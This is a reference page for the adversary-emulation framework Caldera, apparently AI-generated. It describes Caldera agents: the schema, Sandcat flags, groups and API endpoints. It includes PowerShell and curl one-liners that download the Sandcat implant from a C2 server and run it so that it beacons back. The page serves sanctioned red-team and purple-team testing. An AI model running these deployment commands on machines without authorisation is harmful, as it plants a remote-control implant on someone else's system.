---
type: Caldera Concept
title: Agent
description: An agent is an implant/RAT deployed on a target host that beacons to Caldera, receives ability commands, executes them, and returns output.
tags:
  - caldera
  - agent
  - implant
  - sandcat
generated:
  by: claude-sonnet-4-6
  at: '2026-07-30T16:52:00Z'
status: stable
---

# Agent

An **agent** is a running implant process on a target host. Agents beacon to the Caldera C2 server, receive ability commands from active [operations](operation.md), execute them locally, and return results. The primary agent type is **Sandcat** (Go-based, cross-platform).

## Schema

| Field | Type | Description |
|---|---|---|
| `paw` | string | Unique agent ID (e.g., `abc123`) |
| `host` | string | Hostname of the target machine |
| `host_ip_addrs` | array | IP addresses of the target |
| `username` | string | User context the agent runs as |
| `platform` | string | `windows`, `linux`, or `darwin` |
| `architecture` | string | `amd64`, `arm`, etc. |
| `pid` | int | Process ID of the agent |
| `ppid` | int | Parent process ID |
| `exe_name` | string | Name of the agent binary |
| `group` | string | Logical group for targeting (e.g., `red`, `blue`) |
| `contact` | string | C2 contact channel in use (`http`, `tcp`, etc.) |
| `sleep_min` | int | Minimum beacon interval (seconds) |
| `sleep_max` | int | Maximum beacon interval (seconds) |
| `watchdog` | int | Seconds of inactivity before self-destruct |
| `trusted` | bool | Whether the server trusts this agent |
| `alive` | bool | Whether the agent has beaconed recently |
| `links` | array | History of ability executions |
| `facts` | array | Facts discovered by this agent |
| `created` | datetime | When the agent first checked in |

## Deploying Sandcat

Sandcat agents are downloaded from the Caldera server and executed on targets. The server generates a platform-specific binary on demand.

### HTTP (Windows PowerShell)
```powershell
$url = "http://192.168.8.121:8888/file/download"
$wc = New-Object System.Net.WebClient
$wc.Headers.add("platform","windows")
$wc.Headers.add("file","sandcat.go-windows")
$data = $wc.DownloadData($url)
$name = $wc.ResponseHeaders["Content-Disposition"].Split("=")[1]
[io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data)
C:\Users\Public\$name.exe -server http://192.168.8.121:8888 -group red
```

### HTTP (Linux/macOS)
```bash
curl -s -X POST -H "file:sandcat.go-linux" -H "platform:linux" \
  http://192.168.8.121:8888/file/download > /tmp/sandcat
chmod +x /tmp/sandcat
/tmp/sandcat -server http://192.168.8.121:8888 -group red &
```

## Agent Groups

Agents are assigned to named **groups** at deployment time (via `-group` flag). Operations target a group — all agents in that group participate.

Common group names:
- `red` — red team agents
- `blue` — blue team agents (for purple teaming)
- `kali` — attacker-controlled Linux host (used by EMU planners)
- `gosta`, `arrakis`, `gammu`, `caladan` — EMU planner-specific groups

## Sandcat Flags

| Flag | Default | Description |
|---|---|---|
| `-server` | (required) | Caldera server URL |
| `-group` | `red` | Agent group assignment |
| `-contact` | `http` | C2 contact channel |
| `-sleep` | `60` | Beacon interval (seconds) |
| `-watchdog` | `0` | Self-destruct on inactivity (0=off) |
| `-v` | false | Verbose logging |

## API

```
GET    /api/v2/agents              # list all agents
GET    /api/v2/agents/{paw}        # get one agent
PATCH  /api/v2/agents/{paw}        # update agent config
DELETE /api/v2/agents/{paw}        # remove agent record
POST   /api/v2/agents/kill/{paw}   # terminate agent process
```
